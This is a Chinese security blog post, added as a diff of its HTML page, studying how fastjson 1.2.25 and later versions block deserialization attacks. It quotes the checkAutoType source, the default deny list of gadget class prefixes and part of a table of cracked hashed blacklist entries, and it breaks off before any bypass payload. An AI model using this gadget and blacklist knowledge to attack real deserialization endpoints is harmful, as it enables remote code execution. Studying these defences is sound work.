@@ -1,0 +1,1427 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>fastjson3 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言还是跟着Drunkbaby大佬的博客继续学习，这篇是fastjson各版本的绕过，绕过的利用都必须开启AutoTypeSupport才能成功。接着上篇的1.2.24，我们从1.2.25开始。 fastjson1.2.25如何修复的先添加一下依赖包 12345<dependency>      <groupId>com.alibaba</groupId>">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson3">
+<meta property="og:url" content="https://lxu2n.github.io/posts/352f0278/index.html">
+<meta property="og:site_name" content="红烧花园宝宝">
+<meta property="og:description" content="前言还是跟着Drunkbaby大佬的博客继续学习，这篇是fastjson各版本的绕过，绕过的利用都必须开启AutoTypeSupport才能成功。接着上篇的1.2.24，我们从1.2.25开始。 fastjson1.2.25如何修复的先添加一下依赖包 12345<dependency>      <groupId>com.alibaba</groupId>">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
+<meta property="article:published_time" content="2026-01-26T08:38:51.000Z">
+<meta property="article:modified_time" content="2026-01-26T08:40:06.434Z">
+<meta property="article:author" content="红烧花园宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "fastjson3",
+  "url": "https://lxu2n.github.io/posts/352f0278/",
+  "image": "https://lxu2n.github.io/image/1.png",
+  "datePublished": "2026-01-26T08:38:51.000Z",
+  "dateModified": "2026-01-26T08:40:06.434Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "红烧花园宝宝",
+      "url": "https://lxu2n.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/352f0278/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'fastjson3',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://lxu2n.github.io/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">fastjson3</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">fastjson3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-26T08:38:51.000Z" title="发表于 2026-01-26 16:38:51">2026-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-26T08:40:06.434Z" title="更新于 2026-01-26 16:40:06">2026-01-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/Fastjson/">Fastjson</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>还是跟着Drunkbaby大佬的博客继续学习，这篇是fastjson各版本的绕过，绕过的利用都必须开启AutoTypeSupport才能成功。接着上篇的1.2.24，我们从1.2.25开始。</p>
+<h1 id="fastjson1-2-25如何修复的"><a href="#fastjson1-2-25如何修复的" class="headerlink" title="fastjson1.2.25如何修复的"></a>fastjson1.2.25如何修复的</h1><p>先添加一下依赖包</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.2.25&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>这里我们先看一下1.2.24与1.2.25之间的关键区别点<br>首先是1.2.24DefaultJSONParser.parserObject方法<br><img src="/posts/352f0278/20260125145521405.png" alt="image.png"><br>这里有个加载类的方法的调用。作用就是找@type指向的类，并进行加载，类似于Class.forName<br>但是在1.2.25版本的时候，这里改成了checkAutoType<br><img src="/posts/352f0278/20260125145814400.png" alt="image.png"><br>具体看一下checkAutoType方法的逻辑</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) {  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) {  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>); </span><br><span class="line">     </span><br><span class="line">  <span class="comment">//autoTypeSupport默认是false</span></span><br><span class="line">  <span class="comment">/*在autoTypeSupport开启之后会对类先做一个白名单的过滤，若匹配成功就会进行类的加载，若不成功就会进行黑名单的过滤*/</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) {  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) {  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) {  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            }  </span><br><span class="line">        }  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) {  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) {  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"autoType is not support. "</span> + typeName);  </span><br><span class="line">            }  </span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">  <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) {  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) {  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) {  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());  </span><br><span class="line">        }  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    }  </span><br><span class="line">  <span class="comment">/*如果autoTypeSupport没有开启，则会进行一个黑名单的过滤，若没有匹配成功就会进行百名单的过滤，如果匹配成功则进行类的加载*/</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) {  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) {  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) {  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"autoType is not support. "</span> + typeName);  </span><br><span class="line">            }  </span><br><span class="line">        }  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) {  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) {  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) {  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());  </span><br><span class="line">                }  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            }  </span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) {  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) {  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) {  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"autoType is not support. "</span> + typeName);  </span><br><span class="line">        }  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) {  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) {  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            } <span class="keyword">else</span> {  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());  </span><br><span class="line">            }  </span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) {  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">"autoType is not support. "</span> + typeName);  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>autoTypeSupport默认是false，acceptList是白名单（默认为空，可以手动添加），denyList是黑名单（默认是不为空的）。<br>在autoTypeSupport为默认false时，会先对@type指向的类进行黑名单的判断，结果如果匹配成功就会抛出错误，停止运行，如果没有匹配成功就会正常运行。<br>黑名单的内容</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></tbody></table></figure>
+<p>可以看到黑名单中是有<code>com.sun</code>的，我们在1.2.24的利用链中提到了两个利用链，一个是TemplatesImpl链和JdbcRowSetImpl链两者都要用到<code>com.sun</code>,所以现在两条链都不能继续使用了。<br><img src="/posts/352f0278/20260126134957609.png" alt="image.png"><br><img src="/posts/352f0278/20260126135009137.png" alt="image.png"></p>
+<h2 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h2><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。<br>默认情况下是false，将其设置为true的方法是：</p>
+<ol>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
+<li>代码中设置<code>Parserconfig.getGlobalInstance().setAutoTypeSupport(true);</code> 如果使用非全局，parserConfig则要另外调用<code>setAutoTypeSupport(true)</code><br>AutoType白名单的设置方法：</li>
+</ol>
+<ul>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept("com.xx.a");</code></li>
+<li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
+</ul>
+<h1 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h1><p>在1.2.42版本之后，为了增加安全性，将黑名单中的明文形式转换成了密文形式（哈希），但是大部分黑名单已经被人跑出来了。<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL/fastjson-blacklist</a></p>
+<h2 id="目前的列表"><a href="#目前的列表" class="headerlink" title="目前的列表"></a>目前的列表</h2><table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.42</td>
+<td>-8720046426850100497</td>
+<td>0x86fc2bf9beaf7aefL</td>
+<td>org.apache.commons.collections4.comparators</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-8109300701639721088</td>
+<td>0x8f75f9fa0df03f80L</td>
+<td>org.python.core</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7966123100503199569</td>
+<td>0x9172a53f157930afL</td>
+<td>org.apache.tomcat</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-7766605818834748097</td>
+<td>0x9437792831df7d3fL</td>
+<td>org.apache.xalan</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-6835437086156813536</td>
+<td>0xa123a62f93178b20L</td>
+<td>javax.xml</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4837536971810737970</td>
+<td>0xbcdd9dc12766f0ceL</td>
+<td>org.springframework.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-4082057040235125754</td>
+<td>0xc7599ebfe3e72406L</td>
+<td>org.apache.commons.beanutils</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-2364987994247679115</td>
+<td>0xdf2ddff310cdb375L</td>
+<td>org.apache.commons.collections.Transformer</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-1872417015366588117</td>
+<td>0xe603d6a51fad692bL</td>
+<td>org.codehaus.groovy.runtime</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-254670111376247151</td>
+<td>0xfc773ae20c827691L</td>
+<td>java.lang.Thread</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>-190281065685395680</td>
+<td>0xfd5bfc610056d720L</td>
+<td>javax.net.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>313864100207897507</td>
+<td>0x45b11bc78a3aba3L</td>
+<td>com.mchange</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1203232727967308606</td>
+<td>0x10b2bdca849d9b3eL</td>
+<td>org.apache.wicket.util</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>1502845958873959152</td>
+<td>0x14db2e6fead04af0L</td>
+<td>java.util.jar.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3547627781654598988</td>
+<td>0x313bb4abd8d4554cL</td>
+<td>org.mozilla.javascript</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3730752432285826863</td>
+<td>0x33c64b921f523f2fL</td>
+<td>java.rmi</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>3794316665763266033</td>
+<td>0x34a81ee78429fdf1L</td>
+<td>java.util.prefs.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>4147696707147271408</td>
+<td>0x398f942e01920cf0L</td>
+<td>com.sun.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5347909877633654828</td>
+<td>0x4a3797b30328202cL</td>
+<td>java.util.logging.</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5450448828334921485</td>
+<td>0x4ba3e254e758d70dL</td>
+<td>org.apache.bcel</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5751393439502795295</td>
+<td>0x4fd10ddc6d13821fL</td>
+<td>java.net.Socket</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>5944107969236155580</td>
+<td>0x527db6b46ce3bcbcL</td>
+<td>org.apache.commons.fileupload</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>6742705432718011780</td>
+<td>0x5d92e6ddde40ed84L</td>
+<td>org.jboss</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7179336928365889465</td>
+<td>0x63a220e60a17c7b9L</td>
+<td>org.hibernate</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>7442624256860549330</td>
+<td>0x6749835432e0f0d2L</td>
+<td>org.apache.commons.collections.functors</td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>8838294710098435315</td>
+<td>0x7aa7ee3627a19cf3L</td>
+<td>org.apache.myfaces.context.servlet</td>
+</tr>
+<tr>
+<td>1.2.43</td>
+<td>-2262244760619952081</td>
+<td>0xe09ae4604842582fL</td>
+<td>java.net.URL</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8165637398350707645</td>
+<td>0x8eadd40cb2a94443L</td>
+<td>junit.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7921218830998286408</td>
+<td>0x92122d710e364fb8L</td>
+<td>org.osjava.sj.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-7768608037458185275</td>
+<td>0x94305c26580f73c5L</td>
+<td>org.apache.log4j.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-6179589609550493385</td>
+<td>0xaa3daffdb10c4937L</td>
+<td>org.logicalcobwebs.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-5194641081268104286</td>
+<td>0xb7e8ed757f5d13a2L</td>
+<td>org.apache.logging.</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-3935185854875733362</td>
+<td>0xc963695082fd728eL</td>
+<td>org.apache.commons.dbcp</td>
+</tr>
+<tr>
+<td>1.2.46</td>
+<td>-2753427844400776271</td>
+<td>0xd9c9dbf6bbd27bb1L</td>
+<td>com.ibatis.sqlmap.engine.datasource</td>
+</tr>
+<tr>
